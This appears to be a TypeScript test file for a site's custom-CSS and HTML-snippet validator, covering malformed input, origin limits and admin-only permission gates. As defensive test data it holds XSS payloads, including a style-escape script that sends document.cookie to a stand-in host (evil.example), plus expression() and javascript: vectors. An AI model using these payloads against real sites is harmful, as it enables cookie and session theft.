import { readdirSync, readFileSync, statSync } from 'node:fs'
import { join } from 'node:path'
import { describe, expect, it } from 'vitest'
import {
  CSS_MAX_LENGTH,
  checkCustomCss,
  checkSnippetHtml,
  cssForStyleTag,
  hostOf,
  reviewAdvanced,
  SNIPPET_MAX_LENGTH,
} from './advanced'
import { carryAdvanced, EMPTY_ADVANCED, parseAppearance } from './schema'

/**
 * docs/15 "Advanced" lets an operator put arbitrary CSS and arbitrary HTML — `<script>`
 * included — on every public page. Three things have to be true for that to be safe enough
 * to ship, and each has its own block below:
 *
 *  1. an invalid document is refused, never rendered;
 *  2. none of it can reach `/admin`;
 *  3. only the `admin` role can author it, and the roles matrix cannot be used to widen that.
 *
 * (3) is asserted against the resolver in `@palscans/core` by
 * `packages/core/src/__tests__/permission-lockout.test.ts`; what is checked here is that the
 * routes actually ask for the right permission, and that the `settings.write` routes that
 * touch the same document cannot smuggle the block in.
 */

const WEB = join(import.meta.dirname, '../..')
const read = (rel: string) => readFileSync(join(WEB, rel), 'utf8')

const ok = (css: string) => checkCustomCss(css).errors
const codes = (css: string) => ok(css).map((p) => p.code)

describe('1 · invalid CSS is refused rather than rendered', () => {
  it('accepts a stylesheet an operator would actually write', () => {
    const css = `/* nudge the grid */
.series-card { border-radius: 0; margin-block: 4px }
@media (min-width: 900px) { .cover-grid { gap: 18px } }
:root { --custom: url("/covers/bg.avif") }
.quote::before { content: "he said: \\"no\\" }" }`
    expect(checkCustomCss(css)).toMatchObject({ errors: [], warnings: [], hosts: [] })
  })

  it('refuses an unclosed rule — it swallows every rule after it', () => {
    expect(codes('.a { color: red;\n.b { color: blue }')).toContain('unclosed_brace')
  })

  it('refuses a stray closing brace', () => {
    expect(codes('.a { color: red } }\n.b { color: blue }')).toContain('unbalanced_braces')
  })

  it('refuses an unterminated string and an unterminated comment', () => {
    expect(codes('.a::after { content: "oops }')).toContain('unterminated_string')
    expect(codes('/* forgot to close\n.a { color: red }')).toContain('unterminated_comment')
  })

  it('refuses anything that would close the <style> block', () => {
    expect(
      codes('.a{}</style><script>fetch("//evil.example?c="+document.cookie)</script>'),
    ).toContain('style_escape')
    // Quoting it does not help: the HTML parser does not know it was inside a CSS string.
    expect(codes('.a::after { content: "</style>" }')).toContain('style_escape')
  })

  it('refuses @import and off-origin url()', () => {
    expect(codes('@import url("https://fonts.example/x.css");')).toContain('import_rule')
    expect(codes('.a { background: url(https://tracker.example/p.gif) }')).toContain('remote_url')
    expect(codes('.a { background: url(//tracker.example/p.gif) }')).toContain('remote_url')
    expect(checkCustomCss('.a { background: url(https://tracker.example/p.gif) }').hosts).toEqual([
      'tracker.example',
    ])
  })

  it('leaves same-site and data: urls alone — the media library still works', () => {
    expect(ok('.a { background: url(/covers/x.avif) }')).toEqual([])
    expect(ok(".a { background: url('../x.png') }")).toEqual([])
    expect(ok('.a { background: url(data:image/gif;base64,R0lGOD) }')).toEqual([])
  })

  it('refuses the old script-from-a-stylesheet vectors', () => {
    expect(codes('.a { width: expression(alert(1)) }')).toContain('unsafe_value')
    expect(codes('.a { behavior: url(javascript:alert(1)) }')).toContain('unsafe_value')
  })

  it('refuses a stylesheet over the cap', () => {
    expect(codes(`.a{color:red}${' '.repeat(CSS_MAX_LENGTH)}`)).toContain('too_long')
  })

  it('does not mistake a brace, a url or an @import inside a comment or a string for the real thing', () => {
    expect(ok('/* .a { @import url(https://x.example/y) } */\n.b { color: red }')).toEqual([])
    expect(ok('.a::after { content: "{ @import url(https://x.example/y)" }')).toEqual([])
  })

  it('flags a viewport takeover without refusing it, and says which line', () => {
    const result = checkCustomCss('.promo {\n  position: fixed;\n  inset: 0;\n}')
    expect(result.errors).toEqual([])
    expect(result.warnings).toEqual([{ code: 'covers_viewport', line: 2 }])
  })

  it('reports the line a problem starts on', () => {
    expect(ok('.a { color: red }\n\n.b { color: blue\n')[0]).toMatchObject({ line: 3 })
  })

  it('strips a style-block escape at render time as well as at save time', () => {
    // Belt as well as braces: a row can predate the rule, or be written by hand in psql.
    expect(cssForStyleTag('.a{}</style><script>x()</script>')).not.toContain('</style')
  })

  it('is what the route decides with, so the screen and the API cannot disagree', () => {
    const route = read('app/api/admin/appearance/advanced/route.ts')
    const screen = read('components/admin/client/AdvancedScreen.tsx')
    expect(route).toContain('reviewAdvanced')
    expect(screen).toContain('reviewAdvanced')
    // Refused before anything is written.
    expect(route.indexOf('reviewAdvanced')).toBeLessThan(route.indexOf('db.transaction'))
    expect(route).toMatch(/return fail\(\s*422/)
  })

  it('refuses the whole document when any one box is invalid', () => {
    const bad = reviewAdvanced({ css: '.a {', head_html: '', footer_html: '' })
    expect(bad.refusal).toMatchObject({ kind: 'css', field: 'css' })
    const badFooter = reviewAdvanced({ css: '', head_html: '', footer_html: '<div>' })
    expect(badFooter.refusal).toMatchObject({ kind: 'html', field: 'footer_html' })
    expect(reviewAdvanced({ css: '.a{}', head_html: '', footer_html: '' }).refusal).toBeNull()
  })
})

describe('1b · snippets that would break the page are refused', () => {
  const errs = (html: string) => checkSnippetHtml(html).errors.map((p) => p.code)

  it('accepts the shapes an analytics vendor actually ships', () => {
    const plausible =
      '<script defer data-domain="palscans.org" src="https://plausible.io/js/script.js"></script>'
    expect(checkSnippetHtml(plausible)).toMatchObject({ errors: [], hosts: ['plausible.io'] })
    const gtm =
      '<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-X" height="0" width="0" style="display:none"></iframe></noscript>'
    expect(checkSnippetHtml(gtm).errors).toEqual([])
    const pixel =
      '<noscript><img height="1" width="1" src="https://www.facebook.com/tr?id=1"/></noscript>'
    expect(checkSnippetHtml(pixel).errors).toEqual([])
  })

  it('refuses an unclosed tag — it would swallow the rest of the page', () => {
    expect(errs('<div class="wrap">')).toContain('unbalanced_tags')
    expect(errs('<div><span></div>')).toContain('unbalanced_tags')
    expect(errs('</div>')).toContain('stray_close_tag')
  })

  it('ignores HTML comments, which every vendor snippet ships with', () => {
    const ga = `<!-- Google tag (gtag.js) -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-X"></script>
<script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag('js',new Date());gtag('config','G-X')</script>`
    expect(checkSnippetHtml(ga).errors).toEqual([])
    // …including a comment that contains what looks like an unclosed tag.
    expect(checkSnippetHtml('<!-- <div> was here --><span>x</span>').errors).toEqual([])
  })

  it('does not mistake a self-closing script for one that opened a block', () => {
    // `<script src=… />` never opens a block; popping the stack there would close the <div>.
    expect(checkSnippetHtml('<div><script src="/a.js" /></div>').errors).toEqual([])
  })

  it('does not read a script body as markup', () => {
    const js = '<script>if (a<b && c>d) { document.title = "</div>" }</script>'
    expect(checkSnippetHtml(js).errors).toEqual([])
  })

  it('refuses elements outside the snippet allowlist', () => {
    expect(errs('<form action="/x"><input name="p"></form>')).toContain('element_not_allowed')
    expect(errs('<body>')).toContain('element_not_allowed')
    expect(checkSnippetHtml('<h1>hello</h1>').errors[0]).toMatchObject({ detail: 'h1' })
  })

  it('refuses a <meta> tag rather than rendering one that does nothing', () => {
    // The snippet is in the body, not <head> — a verification tag here would never be read,
    // and a box that silently does nothing is the failure this feature must not have.
    expect(errs('<meta name="google-site-verification" content="abc">')).toEqual(['meta_tag'])
  })

  it('refuses a snippet over the cap', () => {
    expect(errs(`<div>${'x'.repeat(SNIPPET_MAX_LENGTH)}</div>`)).toContain('too_long')
  })

  it('lists the off-site hosts a snippet would call, for the day a CSP lands', () => {
    const html =
      '<link rel="preconnect" href="https://cdn.example"><script src="https://a.example/t.js"></script>'
    expect(checkSnippetHtml(html).hosts).toEqual(['a.example', 'cdn.example'])
    expect(checkSnippetHtml('<script src="/local.js"></script>').hosts).toEqual([])
  })

  it('flags document.write without refusing it', () => {
    const r = checkSnippetHtml('<script>document.write("<b>hi</b>")</script>')
    expect(r.errors).toEqual([])
    expect(r.warnings.map((w) => w.code)).toEqual(['document_write'])
  })
})

describe('hostOf', () => {
  it('separates off-origin from same-origin', () => {
    expect(hostOf('https://A.Example/x')).toBe('a.example')
    expect(hostOf('//a.example/x')).toBe('a.example')
    expect(hostOf(' "https://a.example/x" ')).toBe('a.example')
    expect(hostOf('/covers/x.avif')).toBeNull()
    expect(hostOf('x.avif')).toBeNull()
    expect(hostOf('data:image/gif;base64,AA')).toBeNull()
    expect(hostOf('javascript:alert(1)')).toBe('javascript')
  })
})

describe('2 · operator content cannot reach /admin', () => {
  /**
   * The guarantee is structural, not a selector: the components that render operator code
   * are mounted by `app/(site)/layout.tsx`, and the panel, the staff door and the auth pages
   * are sibling route groups with their own layouts, so the markup is not in their tree at
   * all. These assertions are what stops a later edit quietly moving it into the shared root
   * layout, where it would render on `/admin`.
   */
  const RENDERERS = ['CustomCode', 'CustomFooterCode']

  it('mounts the renderers in the public site layout', () => {
    const site = read('app/(site)/layout.tsx')
    for (const name of RENDERERS) expect(site).toContain(`<${name} />`)
    expect(site).toContain("from '@/components/shell/CustomCode'")
  })

  it('keeps them out of the root layout, which /admin shares', () => {
    const root = read('app/layout.tsx')
    expect(root).not.toContain('CustomCode')
    expect(root).not.toContain('cachedCustomCode')
  })

  it('renders the <head> token block from resolved tokens only, never from the operator', () => {
    const style = read('lib/appearance/AppearanceStyle.tsx')
    expect(style).not.toContain('advanced')
    expect(style).not.toContain('cachedCustomCode')
  })

  it('is not reachable from any admin, staff or auth layout', () => {
    for (const rel of ['app/admin/layout.tsx', 'app/(staff)/layout.tsx', 'app/(auth)/layout.tsx']) {
      const src = read(rel)
      expect(src, rel).not.toContain('CustomCode')
      expect(src, rel).not.toContain('cachedCustomCode')
    }
  })

  it('has exactly one reader of the custom-code payload in the whole app', () => {
    const files = sourceFiles(WEB)
    const readers = files.filter(([, src]) => /\bcachedCustomCode\b/.test(src)).map(([p]) => p)
    expect(readers.sort()).toEqual([
      'components/shell/CustomCode.tsx',
      'lib/appearance/advanced.test.ts',
      'lib/appearance/published.ts',
    ])
  })
})

describe('3 · the permission gate holds', () => {
  it('gates the screen and the write route on appearance.advanced', () => {
    expect(read('app/admin/appearance/advanced/page.tsx')).toContain(
      "withPermission('appearance.advanced'",
    )
    expect(read('app/api/admin/appearance/advanced/route.ts')).toContain(
      "withPermission('appearance.advanced'",
    )
    expect(read('components/admin/nav-shared.ts')).toContain("permission: 'appearance.advanced'")
  })

  it('is the only route that writes the block', () => {
    const writers = sourceFiles(join(WEB, 'app/api'))
      .filter(([, src]) => /\badvancedFormSchema\b/.test(src))
      .map(([p]) => p)
    expect(writers).toEqual(['app/api/admin/appearance/advanced/route.ts'])
  })

  it('lets no settings.write route take the block from a request body', () => {
    // The theme routes were rewritten onto generic per-scope machinery, so the guarantee
    // moved with them: `sanitize()` in `lib/appearance/versions.ts` is the one choke point
    // every write passes through — saving a draft, publishing one, and reverting to an old
    // version. The preset import still carries its own, since it never reaches that path.
    const versions = read('lib/appearance/versions.ts')
    expect(versions).toContain('carryAdvanced(')
    // Both directions, named individually so a deleted call site fails rather than a count
    // that a refactor could satisfy by accident: on the way into storage (saveDraft), and
    // back out of it when a revert republishes a document written months ago.
    expect(versions, 'saveDraft must sanitize').toMatch(
      /const doc = await sanitize\(scope, input, database\)/,
    )
    expect(versions, 'publishScope must sanitize a reverted version').toMatch(
      /const restored = await sanitize\(scope, parsed, database\)/,
    )
    expect(read('app/api/admin/appearance/theme/presets/route.ts')).toContain('carryAdvanced(')
  })

  it('carryAdvanced replaces whatever was posted', () => {
    const hostile = parseAppearance({
      color: { accent: '#123456' },
      advanced: { enabled: true, css: 'body{display:none}', head_html: '<script>x()</script>' },
    })
    expect(hostile.advanced.head_html).toBe('<script>x()</script>')
    const stored = { ...EMPTY_ADVANCED, css: '.a{}' }
    const safe = carryAdvanced(hostile, stored)
    expect(safe.advanced).toEqual(stored)
    // …and the rest of the posted document is untouched.
    expect(safe.color.accent).toBe('#123456')
    expect(carryAdvanced(hostile, EMPTY_ADVANCED).advanced).toEqual(EMPTY_ADVANCED)
  })

  it('parses a hostile stored document into something a renderer can hold', () => {
    // A restored backup or a hand-edited row: `css` as an object must not reach innerHTML.
    const doc = parseAppearance({ advanced: { css: { toString: 'no' }, enabled: 'yes' } })
    expect(doc.advanced.css).toBe('')
    expect(typeof doc.advanced.enabled).toBe('boolean')
  })
})

/** Every .ts/.tsx under `dir`, as [path relative to apps/web, source]. */
function sourceFiles(dir: string): [string, string][] {
  const SKIP = new Set(['node_modules', '.next', 'test-results', 'playwright-report', 'dist'])
  const out: [string, string][] = []
  const walk = (d: string) => {
    for (const name of readdirSync(d)) {
      if (SKIP.has(name)) continue
      const p = join(d, name)
      if (statSync(p).isDirectory()) walk(p)
      else if (/\.tsx?$/.test(name)) out.push([p.slice(WEB.length + 1), readFileSync(p, 'utf8')])
    }
  }
  walk(dir)
  return out
}
